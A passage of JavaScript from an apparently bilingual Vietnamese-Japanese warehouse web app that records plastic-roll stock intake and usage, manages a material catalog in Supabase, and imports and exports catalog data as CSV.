                        <button id="btnToggleScan" style="padding:6px 12px; border:none; cursor:pointer; background:${!isManualMode ? '#3b82f6' : 'transparent'}; color:${!isManualMode ? '#fff' : '#64748b'}; display:flex; flex-direction:column; align-items:center; line-height:1.2; gap:2px;">
                            <span style="font-size:12px; font-weight:bold;"><i class="fas fa-barcode"></i> スキャン</span>
                            <span style="font-size:10px; font-weight:normal;">Quét Scan</span>
                        </button>
                        <button id="btnToggleManual" style="padding:6px 12px; border:none; cursor:pointer; background:${isManualMode ? '#10b981' : 'transparent'}; color:${isManualMode ? '#fff' : '#64748b'}; display:flex; flex-direction:column; align-items:center; line-height:1.2; gap:2px;">
                            <span style="font-size:12px; font-weight:bold;"><i class="fas fa-keyboard"></i> 手入力</span>
                            <span style="font-size:10px; font-weight:normal;">Nhập Tay</span>
                        </button>
                    </div>
                </div>
                ${!isManualMode ? scanHtml : manualHtml}
            </div>
        `;
        
        setTimeout(() => {
            document.getElementById('btnToggleScan')?.addEventListener('click', () => { state.inboundMode = 'scan'; renderInbound(); });
            document.getElementById('btnToggleManual')?.addEventListener('click', () => { state.inboundMode = 'manual'; renderInbound(); });

            if(!isManualMode) {
                document.getElementById('btnOpenScanner')?.addEventListener('click', () => triggerAuditCaptureFlow('inboundScanCode'));
                document.getElementById('btnSubmitInbound')?.addEventListener('click', handleInboundSubmit);
            } else {
                document.getElementById('btnSubmitManualInbound')?.addEventListener('click', handleManualInboundSubmit);
                if(!state.catalogData) fetchCatalogTable(true); // background silent fetch
            }
        }, 100);
    }

    async function handleInboundSubmit() {
        var sb = api.check();
        if(!sb) return plmToast('Lỗi CSDL', 'error');

        var scanCode = document.getElementById('inboundScanCode').value.trim();
        var rolls = parseInt(document.getElementById('inboundRolls').value) || 1;
        var meters = parseInt(document.getElementById('inboundMeters').value) || 200;
        var lot = document.getElementById('inboundLot').value.trim() || ('LOT-' + Date.now().toString().slice(-6));
        
        if(!scanCode) return plmToast('Vui lòng quét hoặc nhập mã vạch', 'error');

        var btn = document.getElementById('btnSubmitInbound');
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang lưu...';
        btn.disabled = true;

        var payload = {
            lot_number: lot + "-" + scanCode,
            total_meters_received: rolls * meters,
            meters_per_roll: meters,
            meters_used: 0
        };

        var { data, error } = await sb.from('plastic_stock').insert(payload);
        
        btn.innerHTML = '<i class="fas fa-box-open"></i> Ghi Nhập Kho CSLD';
        btn.disabled = false;

        if(error) {
            plmToast('Lỗi Insert: ' + error.message, 'error');
        } else {
            plmToast('Đã nhập kho thành công lô ' + payload.lot_number, 'success');
            document.getElementById('inboundScanCode').value = '';
            document.getElementById('inboundLot').value = '';
        }
    }

    async function handleManualInboundSubmit() {
        var sb = api.check();
        if(!sb) return plmToast('Lỗi CSDL', 'error');

        var matId = document.getElementById('inboundManualMatId').value;
        var rolls = parseInt(document.getElementById('inboundManRolls').value) || 1;
        var meters = parseInt(document.getElementById('inboundManMeters').value) || 200;
        var lot = document.getElementById('inboundManLot').value.trim() || ('MNL-' + Date.now().toString().slice(-6));
        
        if(!matId) return plmToast('Vui lòng chọn Mã Vật Liệu Nhựa từ Danh mục', 'error');

        var btn = document.getElementById('btnSubmitManualInbound');
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang lưu...';
        btn.disabled = true;

        // Trích xuất mã để ghi vào lot_number
        var matCode = "MAT";
        if(state.catalogData) {
            var catMatch = state.catalogData.find(x => String(x.id) === String(matId));
            if(catMatch) matCode = catMatch.material_code;
        }

        var payload = {
            lot_number: matCode + '-MANUAL-' + lot,
            total_meters_received: rolls * meters,
            meters_per_roll: meters,
            meters_used: 0
        };

        var { data, error } = await sb.from('plastic_stock').insert(payload);
        
        btn.innerHTML = '<i class="fas fa-edit"></i> Xác nhận Ghi Nhập Kho Thủ Công';
        btn.disabled = false;

        if(error) {
            plmToast('Lỗi Insert: ' + error.message, 'error');
        } else {
            plmToast('Đã nhập kho THỦ CÔNG thành công lô ' + payload.lot_number, 'success');
            document.getElementById('inboundManLot').value = '';
        }
    }

    function renderOutbound() {
        el.panels.outbound.innerHTML = `
            <div class="plm-card" style="max-width:650px; margin: 0 auto;">
                <h3 style="color:#1e293b; margin-bottom:20px; font-size:18px;"><i class="fas fa-cut"></i> 使用量報告 (Check-out) <span class="tag-vi" style="margin-left:8px;">Báo Cáo Cắt Nhựa</span></h3>
                
                <div style="background: #fffbeb; padding: 15px; border-radius: 8px; border: 1px solid #fde68a; margin-bottom: 20px;">
                    <label class="plm-label" style="color:#d97706;"><span class="tag-ja">1. 社内ロールID</span> <span class="tag-vi">Mã Lô Kho (PO)</span></label>
                    <div style="display: flex; gap: 10px;">
                        <input type="text" id="outboundScanCode" class="plm-input" placeholder="LOT-XXX...">
                    </div>
                </div>

                <div style="background: #f8fafc; padding: 15px; border-radius: 8px; border: 1px solid #e2e8f0; margin-bottom: 20px;">
                    <label class="plm-label" style="color:#475569;"><span class="tag-ja">2. 使用量・消耗</span> <span class="tag-vi">Thông Số Cắt</span></label>
                    <div style="display: flex; gap: 15px;">
                        <div style="flex:1;">
                            <span class="plm-vi">Số mét đã xài (Hao món)</span>
                            <input type="number" id="outboundMeters" class="plm-input" placeholder="0.0" style="color:#ef4444; font-weight:bold;">
                        </div>
                    </div>
                </div>
                                <button class="plm-btn" id="btnSubmitOutbound" style="background: #ef4444;"><i class="fas fa-minus-circle"></i> Chốt Tiêu Hao Database</button>
            </div>
        `;
        setTimeout(() => {
            document.getElementById('btnSubmitOutbound').addEventListener('click', handleOutboundSubmit);
        }, 100);
    }

    

async function handleOutboundSubmit() {
        var sb = api.check();
        if(!sb) return plmToast('Lỗi CSDL', 'error');

        var lotCode = document.getElementById('outboundScanCode').value.trim();
        var usedMeters = parseFloat(document.getElementById('outboundMeters').value) || 0;
        
        if(!lotCode || usedMeters <= 0) return plmToast('Nhập mã Lô và số mét > 0', 'error');

        var btn = document.getElementById('btnSubmitOutbound');
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang xử lý...';
        btn.disabled = true;

        // Fetch current to deduct
        var { data: stock, error: selErr } = await sb.from('plastic_stock').select('*').eq('lot_number', lotCode).single();
        if(selErr || !stock) {
            btn.innerHTML = '<i class="fas fa-minus-circle"></i> Chốt Tiêu Hao Database';
            btn.disabled = false;
            return plmToast('Không tìm thấy Lô Nhựa này', 'error');
        }

        var newUsed = (parseFloat(stock.meters_used) || 0) + usedMeters;
        var { error: upErr } = await sb.from('plastic_stock').update({ meters_used: newUsed }).eq('id', stock.id);

        btn.innerHTML = '<i class="fas fa-minus-circle"></i> Chốt Tiêu Hao Database';
        btn.disabled = false;

        if(upErr) {
            plmToast('Lỗi Update: ' + upErr.message, 'error');
        } else {
            plmToast('Đã ghi nhận trừ ' + usedMeters + 'm thành công', 'success');
            document.getElementById('outboundMeters').value = '';
        }
    }

    // ==========================================
    // CATALOG TAB (CRUD)
    // ==========================================
    async function renderCatalog() {
        el.panels.catalog.innerHTML = `
            <div class="plm-card" style="padding: 20px;">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; flex-wrap:wrap; gap:10px;">
                    <h3 style="font-size: 18px; margin:0;"><i class="fas fa-list-ul"></i> <span class="tag-ja">材料辞書</span> <span class="tag-vi">Danh Mục Vật Liệu Nhựa</span></h3>
                    <div style="display:flex; gap:10px; flex-wrap:wrap;">
                        <input type="text" id="plmCatalogSearch" class="plm-input" placeholder="検索 / Nhập tên, mã để tìm kiếm..." style="min-width: 280px; padding: 8px 12px; font-size:14px;">
                        <button class="plm-btn" id="plmBtnExportCatalog" style="background:#1e293b; padding:8px 15px; font-size:13px; width:auto;">
                            <i class="fas fa-file-excel"></i> Excel出力 / Xuất Excel
                        </button>
                        <button class="plm-btn" id="plmBtnAddMaterial" style="background:#3b82f6; padding:8px 15px; font-size:13px; width:auto;">
                            <i class="fas fa-plus"></i> 新規追加 / Thêm Mới
                        </button>
                    </div>
                </div>
                
                <div id="plmCatalogContent"><i><i class="fas fa-circle-notch fa-spin"></i> 処理中 / Đang tải danh sách...</i></div>
            </div>

            <!-- Form Overlay (Modal) -->
            <div id="plmCatalogOverlay" style="display:none; position:fixed; inset:0; background:rgba(15,23,42,0.7); z-index:99999; justify-content:center; align-items:center; backdrop-filter:blur(3px);">
                <div style="background:#f8fafc; border-radius:12px; width:95%; max-width:900px; max-height:90vh; overflow-y:auto; box-shadow:0 25px 50px -12px rgba(0,0,0,0.25); border:1px solid #cbd5e1;">
                    <div style="background:#1e293b; color:#fff; padding:16px 20px; display:flex; justify-content:space-between; align-items:center; position:sticky; top:0; z-index:10;">
                        <h4 id="plmCatalogFormTitle" style="margin:0; font-size:16px;">新規追加 / Thêm Vật Liệu Mới</h4>
                        <button id="plmBtnCloseCatalogOverlay" style="background:transparent; border:none; color:#94a3b8; font-size:20px; cursor:pointer;"><i class="fas fa-times"></i></button>
                    </div>
                    
                    <div style="padding:20px;">
                        <input type="hidden" id="plmMatId">
                        <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap:15px; margin-bottom:15px;">
                            <div>
                                <label class="plm-label"><span class="tag-ja">材料コード (必須)</span><span class="plm-vi">Mã Nhựa (Bắt buộc Unique)</span></label>
                                <input type="text" id="plmMatCode" class="plm-input">
                            </div>
                            <div>
                                <label class="plm-label"><span class="tag-ja">材質</span><span class="plm-vi">Chủng Loại (PP, PS, PET...)</span></label>
                                <input type="text" id="plmMatCat" class="plm-input">
                            </div>
                            <div>
                                <label class="plm-label"><span class="tag-ja">色</span><span class="plm-vi">Màu sắc (Color)</span></label>
                                <input type="text" id="plmMatColor" class="plm-input">
                            </div>
                            <div>
                                <label class="plm-label"><span class="tag-ja">厚み (T)</span><span class="plm-vi">Độ dày (Thickness / T)</span></label>
                                <input type="number" step="0.01" id="plmMatT" class="plm-input">
                            </div>
                            <div>
                                <label class="plm-label"><span class="tag-ja">巾 (W)</span><span class="plm-vi">Khổ Rộng (Width / W)</span></label>
                                <input type="number" step="0.1" id="plmMatW" class="plm-input">
                            </div>
                            <div>
                                <label class="plm-label"><span class="tag-ja">巻長 (L)</span><span class="plm-vi">Quy cách Đóng Cuộn (L)</span></label>
                                <input type="number" step="0.1" id="plmMatL" class="plm-input">
                            </div>
                            <div>
                                <label class="plm-label"><span class="tag-ja">メーカー</span><span class="plm-vi">Nhà Sản Xuất (Vendor)</span></label>
                                <input type="text" id="plmMatVendor" class="plm-input">
                            </div>
                            <div>
                                <label class="plm-label"><span class="tag-ja">備考</span><span class="plm-vi">Ghi Chú</span></label>
                                <input type="text" id="plmMatNote" class="plm-input">
                            </div>
                        </div>
                        <div style="display:flex; gap:20px; margin-bottom:20px; background:#fff; padding:15px; border-radius:8px; border:1px solid #e2e8f0; flex-wrap:wrap;">
                            <label style="display:flex; align-items:center; gap:8px; font-size:14px; font-weight:bold; cursor:pointer;"><input type="checkbox" id="plmMatAnti" style="width:18px;height:18px;"> 帯電 (Tĩnh Điện)</label>
                            <label style="display:flex; align-items:center; gap:8px; font-size:14px; font-weight:bold; cursor:pointer;"><input type="checkbox" id="plmMatCond" style="width:18px;height:18px;"> 導電 (Dẫn Điện)</label>
                            <label style="display:flex; align-items:center; gap:8px; font-size:14px; font-weight:bold; cursor:pointer;"><input type="checkbox" id="plmMatSil" style="width:18px;height:18px;"> シリコン (Silicon)</label>
                        </div>
                        <div style="display:flex; gap:10px; justify-content:flex-end; border-top:1px solid #e2e8f0; padding-top:15px; margin-top:10px;">
                            <button class="plm-btn" id="plmBtnCancelForm" style="background:#94a3b8; width:auto; padding:8px 25px;">キャンセル / Hủy</button>
                            <button class="plm-btn" id="plmBtnSaveForm" style="background:#10b981; width:auto; padding:8px 35px;"><i class="fas fa-save"></i> 保存 / LƯU DATA</button>
                        </div>
                    </div>
                </div>
            </div>
        `;
        
        setTimeout(() => {
            document.getElementById('plmBtnAddMaterial')?.addEventListener('click', () => { showMaterialForm(); });
            document.getElementById('plmBtnCancelForm')?.addEventListener('click', () => { document.getElementById('plmCatalogOverlay').style.display = 'none'; });
            document.getElementById('plmBtnCloseCatalogOverlay')?.addEventListener('click', () => { document.getElementById('plmCatalogOverlay').style.display = 'none'; });
            document.getElementById('plmBtnSaveForm')?.addEventListener('click', saveMaterialFormRecord);
            document.getElementById('plmBtnExportCatalog')?.addEventListener('click', exportCatalogCSV);
            
            // Search Input Binding
            document.getElementById('plmCatalogSearch')?.addEventListener('input', function(e) {
                renderCatalogTableHTML(e.target.value.toLowerCase());
            });
        }, 100);

        await fetchCatalogTable();
    }

    async function fetchCatalogTable(silent = false) {
        var sb = api.check();
        var cont = document.getElementById('plmCatalogContent');
        
        if(!sb) { 
            if(cont) cont.innerHTML = '<div style="color:red">Lỗi: Không thể kết nối Supabase</div>'; 
            return; 
        }
        
        var { data, error } = await sb.from('plastic_material').select('*').order('material_category', {ascending: true}).order('material_code', {ascending: true});
        if(error) { 
            if(cont) cont.innerHTML = '<div style="color:red">Lỗi API: '+error.message+'</div>'; 
            return; 
        }
        
        state.catalogData = data || [];
        if(!silent && cont) renderCatalogTableHTML('');
        
        // Cập nhật lại list ở Inbound nếu rỗng và đang mở Manual Mode
        if(state.activeTab === 'inbound' && state.inboundMode === 'manual') {
            var manualSelect = document.getElementById('inboundManualMatId');
            if(manualSelect) {
                var val = manualSelect.value;
                manualSelect.innerHTML = '<option value="">-- Chọn danh mục Vật Liệu Hệ Thống --</option>' + (state.catalogData.map(c => '<option value="'+c.id+'">' + (c.material_category||'') + ' - ' + c.material_code + '</option>').join(''));
                manualSelect.value = val;
            }
        }
    }

    function renderCatalogTableHTML(searchStr) {
        var cont = document.getElementById('plmCatalogContent');
        if(!state.catalogData || state.catalogData.length === 0) {
            cont.innerHTML = '<div style="padding:20px; text-align:center; color:#64748b;">データなし / Chưa có dữ liệu danh mục nào. Hãy bấm Thêm Mới.</div>';
            return;
        }

        var filtered = state.catalogData;
        if(searchStr) {
            filtered = state.catalogData.filter(x => {
                var code = (x.material_code||'').toLowerCase();
                var cat = (x.material_category||'').toLowerCase();
                var color = (x.color||'').toLowerCase();
                var vendor = (x.manufacturer||'').toLowerCase();
                return code.includes(searchStr) || cat.includes(searchStr) || color.includes(searchStr) || vendor.includes(searchStr);
            });
        }

        var html = '<div class="plm-table-wrapper"><table class="plm-table">';
        html += `
            <thead>
                <tr>
                    <th style="width:160px;"><span class="tag-ja">操作</span><br><span class="tag-vi">Thao tác</span></th>
                    <th><span class="tag-ja">材質</span><br><span class="tag-vi">Loại (Cat)</span></th>
                    <th><span class="tag-ja">材料コード</span><br><span class="tag-vi">Mã Vật Liệu</span></th>
                    <th><span class="tag-ja">寸法 (T x W x L) / 色</span><br><span class="tag-vi">Quy cách / Màu</span></th>
                    <th><span class="tag-ja">特徴</span><br><span class="tag-vi">Đặc Tính (Tĩnh Điện/Dẫn/Silicon)</span></th>
                </tr>
            </thead>
            <tbody>
        `;
        
        filtered.forEach(item => {
            var specs = [];
            if(item.thickness) specs.push('T' + item.thickness);
            if(item.width) specs.push('W' + item.width);
            if(item.length) specs.push('L' + item.length);
            var specStr = specs.join(' x ') + (item.color ? ' - ' + item.color : '');
            
            var badges = '';
            if(item.anti_static) badges += '<span class="plm-badge blue" style="margin-right:5px;">帯電 (Tĩnh Điện)</span>';
            if(item.conductive) badges += '<span class="plm-badge red" style="margin-right:5px;">導電 (Dẫn Điện)</span>';
            if(item.silicon_coating) badges += '<span class="plm-badge green">シリコン (Silicon)</span>';

            html += `
                <tr>
                    <td style="white-space:nowrap;">
                        <button class="plm-btn-edit" data-id="${item.id}" style="background:#3b82f6; color:#fff; border:none; padding:6px 10px; border-radius:4px; cursor:pointer; font-size:12px; margin-right:5px; font-weight:bold;">
                            <i class="fas fa-edit"></i> 編集 / Sửa
                        </button>
                        <button class="plm-btn-del" data-id="${item.id}" style="background:#ef4444; color:#fff; border:none; padding:6px 10px; border-radius:4px; cursor:pointer; font-size:12px; font-weight:bold;">
                            <i class="fas fa-trash"></i> 削除 / Xóa
                        </button>
                    </td>
                    <td><b>${item.material_category || '---'}</b></td>
                    <td style="font-family:monospace; color:#2563eb; font-weight:bold;">${item.material_code}</td>
                    <td>${specStr}</td>
                    <td>${badges}</td>
                </tr>
            `;
        });
        
        if(filtered.length === 0) {
            html += '<tr><td colspan="5" style="text-align:center; padding:20px; color:#64748b;">検索結果がありません / Không tìm thấy kết quả</td></tr>';
        }

        html += '</tbody></table></div>';
        cont.innerHTML = html;
        
        // Gắn DOM
        document.querySelectorAll('.plm-btn-edit').forEach(b => b.addEventListener('click', function() {
            var rawId = this.getAttribute('data-id');
            var item = state.catalogData.find(x => String(x.id) === String(rawId));
            if(item) showMaterialForm(item);
            else console.log("Không tìm thấy item. rawId=", rawId);
        }));
        
        document.querySelectorAll('.plm-btn-del').forEach(b => b.addEventListener('click', async function() {
            var rawId = this.getAttribute('data-id');
            if(confirm("警告: この材料データを完全に削除してもよろしいですか？\n\nCẢNH BÁO: Rút dữ liệu này khỏi hệ thống? Hành động này sẽ tự động xóa trên đám mây!")) {
                var sb2 = api.check();
                await sb2.from('plastic_material').delete().eq('id', rawId);
                fetchCatalogTable(); // Reload from cloud
            }
        }));
    }

    function showMaterialForm(item = null) {
        var overlay = document.getElementById('plmCatalogOverlay');
        var title = document.getElementById('plmCatalogFormTitle');
        overlay.style.display = 'flex';
        
        if(!item) {
            title.innerHTML = '<i class="fas fa-plus-circle"></i> 新規追加 / THÊM MỚI VẬT LIỆU';
            document.getElementById('plmMatId').value = '';
            document.getElementById('plmMatCode').value = '';
            document.getElementById('plmMatCat').value = '';
            document.getElementById('plmMatColor').value = '';
            document.getElementById('plmMatT').value = '';
            document.getElementById('plmMatW').value = '';
            document.getElementById('plmMatL').value = '';
            document.getElementById('plmMatVendor').value = '';
            document.getElementById('plmMatNote').value = '';
            document.getElementById('plmMatAnti').checked = false;
            document.getElementById('plmMatCond').checked = false;
            document.getElementById('plmMatSil').checked = false;
        } else {
            title.innerHTML = '<i class="fas fa-edit"></i> 編集 / CHỈNH SỬA MÃ VẬT LIỆU: ' + item.material_code;
            document.getElementById('plmMatId').value = item.id;
            document.getElementById('plmMatCode').value = item.material_code || '';
            document.getElementById('plmMatCat').value = item.material_category || '';
            document.getElementById('plmMatColor').value = item.color || '';
            document.getElementById('plmMatT').value = item.thickness || '';
            document.getElementById('plmMatW').value = item.width || '';
            document.getElementById('plmMatL').value = item.length || '';
            document.getElementById('plmMatVendor').value = item.manufacturer || '';
            document.getElementById('plmMatNote').value = item.feature_note || '';
            document.getElementById('plmMatAnti').checked = !!item.anti_static;
            document.getElementById('plmMatCond').checked = !!item.conductive;
            document.getElementById('plmMatSil').checked = !!item.silicon_coating;
        }
    }

    async function saveMaterialFormRecord() {
        var sb = api.check();
        if(!sb) return;
        
        var id = document.getElementById('plmMatId').value;
        var code = document.getElementById('plmMatCode').value.trim();
        if(!code) return alert("材料コードは必須です。 / Mã Nhựa không được bỏ trống!");

        var btn = document.getElementById('plmBtnSaveForm');
        var oldHtml = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 処理中 / ĐANG GHI MÂY...';
        btn.disabled = true;
        
        var payload = {
            material_code: code,
            material_category: document.getElementById('plmMatCat').value.trim() || null,
            color: document.getElementById('plmMatColor').value.trim() || null,
            thickness: parseFloat(document.getElementById('plmMatT').value) || null,
            width: parseFloat(document.getElementById('plmMatW').value) || null,
            length: parseFloat(document.getElementById('plmMatL').value) || null,
            manufacturer: document.getElementById('plmMatVendor').value.trim() || null,
            feature_note: document.getElementById('plmMatNote').value.trim() || null,
            anti_static: document.getElementById('plmMatAnti').checked,
            conductive: document.getElementById('plmMatCond').checked,
            silicon_coating: document.getElementById('plmMatSil').checked
        };
        
        var error = null;
        if(id) {
            var res = await sb.from('plastic_material').update(payload).eq('id', parseInt(id));
            error = res.error;
        } else {
            var res = await sb.from('plastic_material').insert(payload);
            error = res.error;
        }

        btn.innerHTML = oldHtml;
        btn.disabled = false;
        
        if (error) {
            alert("エラー / Lỗi Supabase:\n" + error.message);
        } else {
            alert("保存しました / Đã Lưu dữ liệu Vật Liệu thành công vào CSDL chung!");
            document.getElementById('plmCatalogOverlay').style.display = 'none';
            fetchCatalogTable(); // Reload GRID
        }
    }

    function exportCatalogCSV() {
        if(!state.catalogData || state.catalogData.length === 0) return alert("Chưa có dữ liệu!");
        
        // Convert to CSV
        var headers = ['ID', 'Material_Code', 'Category', 'Color', 'Thickness', 'Width', 'Length', 'Anti_Static', 'Conductive', 'Silicon', 'Manufacturer', 'Notes'];
        var rows = [];
        rows.push('"' + headers.join('","') + '"');
        
        state.catalogData.forEach(d => {
            var row = [
                d.id, d.material_code, (d.material_category||''), (d.color||''), 
                (d.thickness||''), (d.width||''), (d.length||''), 
                (d.anti_static ? 'YES' : ''), (d.conductive ? 'YES' : ''), (d.silicon_coating ? 'YES' : ''),
                (d.manufacturer||''), (d.feature_note||'')
            ];
            // escape quotes
            var escapedRow = row.map(cell => '"' + String(cell).replace(/"/g, '""') + '"');
            rows.push(escapedRow.join(','));
        });
        
        var csvContent = "\uFEFF" + rows.join('\n'); // BOM for Excel UTF-8
        var blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.href = url;
        a.download = 'WMS_Plastic_Material_Catalog.csv';
        a.click();
        URL.revokeObjectURL(url);
    }

    function renderMapping() {
        el.panels.mapping.innerHTML = `
            <div class="plm-card" style="padding: 30px;">
                <h3 style="margin-bottom: 20px; font-size: 18px;"><i class="fas fa-magic"></i> データ紐付け / Mapping Dữ Liệu Tự Động & Import CSV</h3>
                
                <div style="background: #f1f5f9; padding: 20px; border-radius: 12px; border: 1px solid #e2e8f0; margin-bottom: 20px;">
                    <h4 style="margin-bottom: 10px; color: #f59e0b;"><i class="fas fa-exclamation-triangle"></i> Khu vực Migrate Data Cấu Hình Ban Đầu</h4>
                    <p style="font-size: 13px; color: #64748b; margin-bottom: 15px;">Chỉ sử dụng công cụ này 1 lần duy nhất để đẩy dữ liệu từ 2 file <b>plastics.csv</b> và <b>plastics_chithisanxuat.csv</b> lên hệ thống Supabase trống.</p>
                    
                    <div style="margin-bottom: 20px;">
                        <label class="plm-label">Mã hoá file (Encoding): </label>
                        <select id="csvEncoding" class="plm-input" style="max-width: 250px;">
                            <option value="UTF-8">UTF-8 (Mặc định)</option>
                            <option value="Shift_JIS">Shift_JIS (Excel Nhật cũ)</option>
                        </select>
                    </div>

                    <div style="display: flex; gap: 20px; flex-wrap: wrap;">
                        <div style="flex:1; min-width: 250px; background: #fff; padding: 20px; border-radius: 8px; border: 1px dashed #cbd5e1;">
                            <label class="plm-label" style="color:#3b82f6;">1. Bảng Nhựa Chuẩn (plastics.csv)</label>
                            <input type="file" id="filePlasticMaterial" accept=".csv" style="margin-bottom: 15px; width: 100%;">
                            <button class="plm-btn" id="btnImportMaterial" style="background: #3b82f6;"><i class="fas fa-upload"></i> Xử lý & Đẩy lên plastic_material</button>
                        </div>
                        
                        <div style="flex:1; min-width: 250px; background: #fff; padding: 20px; border-radius: 8px; border: 1px dashed #cbd5e1;">
                            <label class="plm-label" style="color:#8b5cf6;">2. Text Chỉ Thị (plastics_chithisanxuat.csv)</label>
                            <input type="file" id="filePlasticText" accept=".csv" style="margin-bottom: 15px; width: 100%;">
                            <button class="plm-btn" id="btnImportText" style="background: #8b5cf6;"><i class="fas fa-upload"></i> Xử lý & Đẩy lên plastic_text_variant</button>
                        </div>
                    </div>
                    
                    <div id="importLog" style="margin-top: 20px; font-size: 13px; font-family: monospace; background: #1e293b; color: #10b981; padding: 20px; border-radius: 8px; max-height: 250px; overflow-y: auto; display: none;"></div>
                </div>
            </div>
        `;

        setTimeout(() => {
            document.getElementById('btnImportMaterial')?.addEventListener('click', handleImportMaterial);
            document.getElementById('btnImportText')?.addEventListener('click', handleImportTextVariant);
        }, 100);
    }

    // --- CÔNG CỤ IMPORT LOGGER ---
    function appendImportLog(msg) {
        var logEl = document.getElementById('importLog');
        if(!logEl) return;
        logEl.style.display = 'block';
        logEl.innerHTML += '<div style="margin-bottom:4px;">> ' + msg + '</div>';
        logEl.scrollTop = logEl.scrollHeight;
    }

    async function handleImportMaterial() {
        var fileInput = document.getElementById('filePlasticMaterial');
        var encoding = document.getElementById('csvEncoding') ? document.getElementById('csvEncoding').value : 'UTF-8';
        if(!fileInput.files || fileInput.files.length === 0) return alert("Chưa chọn file plastics.csv");
        
        var file = fileInput.files[0];
        var reader = new FileReader();
        reader.onload = async function(e) {
            var rawText = e.target.result;
            var data = parseCSVLine(rawText);
            appendImportLog("Đã đọc " + data.length + " dòng cấu trúc plastics.csv");
            
            // Map Schema vào plastic_material MỚI CHI TIẾT
            var insertPayload = data.map(row => {
               var rawType = row['TypeVL'] || row['NhaSXVL'] || ''; 
               var tText = row['T'] || '';
               var wText = row['W'] || '';
               var lText = row['L'] || '';
               
               // Sinh Mã Định Danh (Hiển thị UI)
               var wPart = wText ? 'x' + wText : '';
               var lPart = lText ? 'x' + lText : '';
               var code = (rawType + ' ' + tText + wPart + lPart).trim().replace(/ +/g, ' ');
               if(code === '') code = 'RAW_' + Math.random().toString(36).substring(2, 6);

               // Phân loại
               var category = null;
               var upperType = rawType.toUpperCase();
               if(upperType.indexOf('PS') !== -1 || upperType.indexOf('PST') !== -1) category = 'PS';
               else if(upperType.indexOf('PP') !== -1) category = 'PP';
               else if(upperType.indexOf('PET') !== -1 || upperType.indexOf('APET') !== -1) category = 'PET';
               else if(upperType.indexOf('PVC') !== -1) category = 'PVC';

               var color = null;
               if(upperType.indexOf('(N)') !== -1 || upperType.indexOf('ナチュラル') !== -1) color = 'ナチュラル';
               else if(upperType.indexOf('(CL)') !== -1 || upperType.indexOf('透明') !== -1) color = '透明';
               else if(upperType.indexOf('(B)') !== -1 || upperType.indexOf('黒') !== -1) color = '黒';
               else if(upperType.indexOf('(G)') !== -1 || upperType.indexOf('緑') !== -1) color = '緑';

               var tNum = parseFloat(tText);
               var wNum = parseFloat(wText);
               var lNum = parseFloat(lText);

               var isAntiStatic = (row['ThanhPhanAN'] || '').toUpperCase() === 'TRUE';
               var isSilicon = (row['ThanhPhanSI'] || '').toUpperCase() === 'TRUE';
               var isConductive = (upperType.indexOf('導電') !== -1 || upperType.indexOf('ミクロム') !== -1);
               
               var featureNote = [row['ghichuVl'], row['GroupVL']].filter(x => x).join(' | ');

               return {
                   material_code: code,
                   material_category: category,
                   color: color,
                   thickness: isNaN(tNum) ? null : tNum,
                   width: isNaN(wNum) ? null : wNum,
                   length: isNaN(lNum) ? null : lNum,
                   anti_static: isAntiStatic,
                   silicon_coating: isSilicon,
                   conductive: isConductive,
                   manufacturer: row['NhaSXVL'] || null,
                   feature_note: featureNote || null
               };
            });

            var uniquePayload = [];
            var codeSet = new Set();
            for(var item of insertPayload) {
                if(!codeSet.has(item.material_code)) {
                    codeSet.add(item.material_code);
                    uniquePayload.push(item);
                }
            }
            appendImportLog("Sau khi lọc mã trùng nhau: " + uniquePayload.length + " mã VL duy nhất.");
            
            var sb = api.check();
            if(!sb) return;
            
            appendImportLog("♻️ Đang Bắn dữ liệu lên Supabase bảng <b>plastic_material</b>...");
            
            let chunkSize = 50;
            let successCount = 0;
            for (let i = 0; i < uniquePayload.length; i += chunkSize) {
                const chunk = uniquePayload.slice(i, i + chunkSize);
                const { data: ret, error } = await sb.from('plastic_material').insert(chunk).select();
                if (error) {
                    if(error.code === '23505') appendImportLog("<span style='color:#f59e0b'>Lô " + i + " có chứa mã đã tồn tại (Đã bỏ qua).</span>");
                    else appendImportLog("<span style='color:#ef4444'>❌ Lỗi Insert: " + error.message + "</span>");
                } else {
                    successCount += chunk.length;
                    appendImportLog("✅ Đã đẩy thành công lô " + successCount + " / " + uniquePayload.length);
                }
            }
            appendImportLog("🎉 <b>HOÀN TẤT IMPORT BẢNG VẬT LIỆU CHUẨN!</b>");
        };
        reader.readAsText(file, encoding);
    }

    async function handleImportTextVariant() {
        var fileInput = document.getElementById('filePlasticText');
        var encoding = document.getElementById('csvEncoding') ? document.getElementById('csvEncoding').value : 'UTF-8';
        if(!fileInput.files || fileInput.files.length === 0) return alert("Chưa chọn file plastics_chithisanxuat.csv");
        
        var file = fileInput.files[0];
        var reader = new FileReader();
        reader.onload = async function(e) {
            var rawText = e.target.result;
            var lines = rawText.split(/\r?\n/);
            appendImportLog("Đã đọc tổng cộng " + lines.length + " dòng biến thể, Đang Extract Text...");
            
            var textSet = new Set();
            for(let i = 1; i < lines.length; i++) {
                let line = lines[i];
                if(!line.trim()) continue;
                
                let matches = line.match(/(?:^|,)(?:"([^"]*)"|([^,]*))/g);
                if(matches && matches.length > 0) {
                    let firstCol = matches[0].replace(/^,/, '').replace(/^"/, '').replace(/"$/, '').trim();
                    if(firstCol) textSet.add(firstCol);
                }
            }
            
            var uniqueList = Array.from(textSet);
            appendImportLog("🪄 Khám phá ra " + uniqueList.length + " chuỗi Unique Text. Đang tải lên <b>plastic_text_variant</b>...");
            
            var sb = api.check();
            if(!sb) return;
            
            var insertPayload = uniqueList.map(t => ({ text_value: t, is_verified: false }));
            
            let chunkSize = 50;
            let successCount = 0;
            for (let i = 0; i < insertPayload.length; i += chunkSize) {
                const chunk = insertPayload.slice(i, i + chunkSize);
                const { data: ret, error } = await sb.from('plastic_text_variant').insert(chunk);
                if (error) {
                    if(error.code === '23505') appendImportLog("<span style='color:#f59e0b'>Lô " + i + " trùng Text đã tồn tại.</span>");
                    else appendImportLog("<span style='color:#ef4444'>❌ Lỗi Insert: " + error.message + "</span>");
                } else {
                    successCount += chunk.length;
